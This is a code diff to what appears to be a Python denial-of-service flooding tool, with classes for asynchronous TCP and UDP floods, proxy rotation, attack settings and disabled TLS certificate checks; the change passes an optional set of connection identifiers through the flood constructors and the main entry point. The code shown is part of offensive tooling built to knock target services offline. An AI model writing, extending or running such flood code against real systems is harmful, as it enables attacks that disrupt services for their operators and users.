@@ -11,7 +11,7 @@ from os import urandom as randbytes
 from socket import (inet_ntoa, SO_LINGER, SO_RCVBUF, SOL_SOCKET)
 from ssl import CERT_NONE, create_default_context, SSLContext
 from string import ascii_letters
-from typing import Callable, Optional, Tuple
+from typing import Callable, Optional, Set, Tuple
 from urllib import parse
 
 import aiohttp
@@ -144,7 +144,8 @@ class FloodBase:
         addr: str,
         proxies: ProxySet,
         loop,
-        settings: AttackSettings
+        settings: AttackSettings,
+        connections: Optional[Set[int]],
     ):
         self._target = target
         self._method = method
@@ -153,6 +154,7 @@ class FloodBase:
         self._proxies = proxies
         self._loop = loop
         self._settings = settings
+        self._connections = connections
 
         self._raw_address = (self._addr, (self._url.port or 80))
         self.SENT_FLOOD = getattr(self, self._method)
@@ -264,6 +266,7 @@ class AsyncTcpFlood(FloodBase):
             on_close,
             self._settings,
             FloodSpec.from_any(payload_type, payload, self._settings.requests_per_connection),
+            connections=self._connections,
             on_connect=on_connect,
         )
         server_hostname = "" if self.is_tls else None
@@ -680,7 +683,7 @@ class AsyncUdpFlood(FloodBase):
         return await self._generic_flood(lambda: (packet, packet_size))
 
 
-def main(target, method, proxies, loop, settings):
+def main(target, method, proxies, loop, settings, connections=None):
     (url, ip), proxies = Tools.parse_params(target, proxies)
     if method in {*Methods.HTTP_METHODS, *Methods.TCP_METHODS}:
         return AsyncTcpFlood(
@@ -691,6 +694,7 @@ def main(target, method, proxies, loop, settings):
             proxies,
             loop=loop,
             settings=settings,
+            connections=connections,
         )
 
     elif method in Methods.UDP_METHODS:
